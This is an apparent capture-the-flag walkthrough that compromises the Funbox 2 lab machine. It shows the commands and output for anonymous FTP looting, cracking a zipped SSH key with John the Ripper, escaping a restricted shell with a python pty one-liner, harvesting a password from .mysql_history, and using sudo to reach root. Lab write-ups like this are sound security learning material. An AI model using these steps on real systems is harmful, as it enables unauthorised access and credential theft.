<div style="background-color: rgb(50, 50, 50);">
<span style ="color:grey">

# \[----Funbox 2 Guide----\]

## [----Setup Requirments----]
First run a Kali Linux Machine, PFSense 2, and the Funbox 2 box.

Login on the Kali Linux Machine and launch a terminal

## [----Key----]
<span style="color:lightblue">Lightblue Text indicates a detail such as a ran command or relevant important information </span>

<span style="color:darkgreen">Dark green Text indicates command results</span>
## \[----Tools Used----\]
<span style="color:lightblue">`nmap`</span></br>
<span style="color:lightblue">`ftp`</span></br>
<span style="color:lightblue">`ssh`</span></br>
<span style="color:lightblue">`python3`</span></br>
<span style="color:lightblue">`johntheripper`</span></br>
## \[----Enumeration----\]

at <span style="color:lightblue">\[03/29/23 1:09:35\]</span> i ran the following command <span style="color:lightblue">`sudo namp -PO 192.168.10.0/24`</span> to find the machine's ip and relevant information about services using <span style="color:lightblue">`-PO`</span> to bypass filtering on the ports of the machine which returned the following

> <span style="color:darkgreen">
> Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-29 13:09 EDT</br>
> Nmap scan report for pfSense.home.arpa (192.168.10.1)</br></br>
> Host is up (0.00046s latency).</br>
> Not shown: 998 filtered tcp ports (no-response)</br>
> PORT   STATE SERVICE</br>
> 53/tcp open  domain</br>
> 80/tcp open  http</br>
> MAC Address: 08:00:27:B8:0B:67 (Oracle VirtualBox virtual NIC)
>
> Nmap scan report for 192.168.10.6</br>
> Host is up (0.00031s latency).</br>
> Not shown: 997 closed tcp ports (reset)</br>
> PORT   STATE SERVICE</br>
> 21/tcp open  ftp</br>
> 22/tcp open  ssh</br>
> 80/tcp open  http</br>
> MAC Address: 08:00:27:CF:01:65 (Oracle VirtualBox virtual NIC)
>
> Nmap scan report for 192.168.10.3</br>
> Host is up (0.0000030s latency).</br>
> All 1000 scanned ports on 192.168.10.3 are in ignored states.</br>
> Not shown: 1000 closed tcp ports (reset)
>
> Nmap done: 256 IP addresses (3 hosts up) scanned in 6.89 seconds
> </span>

this scan revealed the following services <span style="color:lightblue">`FTP`</span>, <span style="color:lightblue">`SSH`</span>, and <span style="color:lightblue">`HTTP`</span> running on the vulnerable machine at the ip address of <span style="color:lightblue">`192.168.10.6`</span>

## \[----FTP----\]

using this information at <span style="color:lightblue">\[03/29/23 1:16:27\]</span> i ran <span style="color:lightblue">`ftp 192.168.10.6 -p 21`</span> to access the relevant running FTP service logging in under the anonymous username

upon logging on under the <span style="color:darkgrey">**anonymous**</span> user account with no password i ran <span style="color:lightblue">`ls -la`</span> to retrieve the directory contents of the server which returned the following information

> <span style="color:darkgreen">
> 229 Entering Extended Passive Mode (|||31812|)</br>
> 150 Opening ASCII mode data connection for file list</br>
> drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 .</br>
> drwxr-xr-x   2 ftp      ftp          4096 Jul 25  2020 ..</br>
> -rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip</br>
> -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip</br>
> -rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users</br>
> -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg</br>
> -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip</br>
> 226 Transfer complete
> </span>

with the gained knowledge of the accessible files i used <span style="color:lightblue">`get`</span> to obtain <span style="color:lightblue">`.@users`</span>, <span style="color:lightblue">`.@admins`</span> and all the <span style="color:lightblue">`.zip`</span> files located on the server

upon collection of the following files i exited the ftp server using <span style="color:lightblue">`exit`</span> at <span style="color:lightblue">\[03/29/23 1:25:11\]</span>  

## \[----FTP Server File Analysis----\]

using the command <span style="color:lightblue">`cat .@users`</span> in the directory containing the downloaded files off the ftp server i gained the following **Valuable** information

> <span style="color:darkgreen">
> Hi Users,
>
> be carefull with your keys. Find them in %yourname%.zip.</br>
> The passwords are the old ones.
>
> Regards</br>
> root
> </span>

using this information i attempted to extract files from <span style="color:lightblue">`tom.zip`</span> using <span style="color:lightblue">`unzip`</span> which revealed a password requirment on the zip file.

> <span style="color:darkgreen">
> Archive:  tom.zip</br>
> \[tom.zip\] id_rsa password: 
> </span>

with this information i used the command of <span style="color:lightblue">`zip2john tom.zip >> tom.hash`</span> to generate a <span style="color:darkgrey">**johntheripper**</span>  crackable hash

doing the command <span style="color:lightblue">`john tom.hash`</span> at <span style="color:lightblue">\[03/29/23 1:36:36\]</span> revealed the following information including the password for the zip

> <span style="color:darkgreen">
> Using default input encoding: UTF-8</br>
> Loaded 1 password hash (PKZIP [32/64])</br>
> Will run 4 OpenMP threads</br>
> Proceeding with single, rules:Single</br>
> Press 'q' or Ctrl-C to abort, almost any other key for status</br>
> Almost done: Processing the remaining buffered candidate passwords, if any.</br>
> Proceeding with wordlist:/usr/share/john/password.lst</br>
> **iubire**           (tom.zip/id_rsa)     </br>
> 1g 0:00:00:00 DONE 2/3 (2023-03-29 13:36) 20.00g/s 937980p/s 937980c/s 937980C/s 123456..felipes</br>
> Use the "--show" option to display all of the cracked passwords reliably</br>
> Session completed. 
> </span>

with this i did <span style="color:lightblue">`unzip tom.zip`</span> and entered the password of <span style="color:lightblue">`iubire`</span> giving me tom's id_rsa key

## \[----Accessing the Machine And Elevating Privilege----\]

with the newly acquired id_rsa key i ran <span style="color:lightblue">`ssh tom@192.168.10.6 -i id_rsa`</span> at <span style="color:lightblue">\[03/29/23 1:38:21\]</span> gaining remote acess to the machine via a ssh shell

I quickly upon connecting and opening a shell to the machine learned that the machine was running under restricted shell to bypass this i ran the following <span style="color:lightblue">`python3 -c 'import pty; pty.spawn("/bin/bash/")'`</span> to gain a unrestricted shell on the machine.

with this new found unrestriction i ran <span style="color:lightblue">`ls -la`</span> to reveal the contents of tom's home directory

> <span style="color:darkgreen">
> total 40</br>
> drwxr-xr-x 5 tom  tom  4096 Jul 25  2020 .</br>
> drwxr-xr-x 3 root root 4096 Jul 25  2020 ..</br>
> -rw------- 1 tom  tom     6 Jul 25  2020 .bash_history</br>
> -rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout</br>
> -rw-r--r-- 1 tom  tom  3771 Apr  4  2018 .bashrc</br>
> drwx------ 2 tom  tom  4096 Jul 25  2020 .cache</br>
> drwx------ 3 tom  tom  4096 Jul 25  2020 .gnupg</br>
> -rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history</br>
> -rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile</br>
> drwx------ 2 tom  tom  4096 Jul 25  2020 .ssh</br>
> -rw-r--r-- 1 tom  tom     0 Jul 25  2020 .sudo_as_admin_successful</br>
> -rw------- 1 tom  tom     0 Jul 25  2020 .viminfo
> </span>

using these contents i quickly strated running <span style="color:lightblue">`cat`</span> to look at the contents of the files

the following in order revealed no useful information <span style="color:lightblue">`.viminfo`, `.sudo_as_admin_successful`, `.profile`</span>.

However upon running <span style="color:lightblue">`cat .mysql_history`</span> it revealed the following 

> <span style="color:darkgreen">
> \_HiStOrY\_V2\_
> show\040databases;</br>
> quit</br>
> create\040database\040'support';</br>
> create\040database\040support;</br>
> use\040support</br>
> create\040table\040users;</br>
> show\040tables</br>
> ;</br>
>select\040*\040from\040support</br>
> ;</br>
> show\040tables;</br>
> select\040*\040from\040support;</br>
> insert\040into\040support\040(tom,\040xx11yy22!);</br>
> quit</br>
></span>

due to the following newfound information i attempted the following command <span style="color:lightblue">`sudo -l`</span> using <span style="color:lightblue">`xx11yy22!`</span> as the password required for sudo execution to see if tom had sudo privileges which gave the following output

> <span style="color:darkgreen">
> Matching Defaults entries for tom on funbox2:</br>
>    env_reset, mail_badpass,</br>
>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
> </span></br></br>
> 
> <span style="color:darkgreen">
> User tom may run the following commands on funbox2:</br>
>    (ALL : ALL) ALL
> </span>

with this found information i used <span style="color:lightblue">`sudo -i`</span> to launch a interative shell as the root user and was able to <span style="color:lightblue">`cat flag.txt`</span> to get the end goal output.

## \[----End Result Analysis----\]
due to the improperly secured services on the host of <span style="color:lightblue">`192.168.10.6`</span> it is possible to find and abuse information from the service of <span style="color:lightblue">`ftp`</span> as the <span style ="color:darkgrey">**Anonymous**</span> user account which requires no password to gain information and later a id_rsa key file. Through this it is possible to login to a user ssh account and by using <span style="color:lightblue">`MySql`</span> command logging find the relevant user password which has complete sudo access and gain root level access.
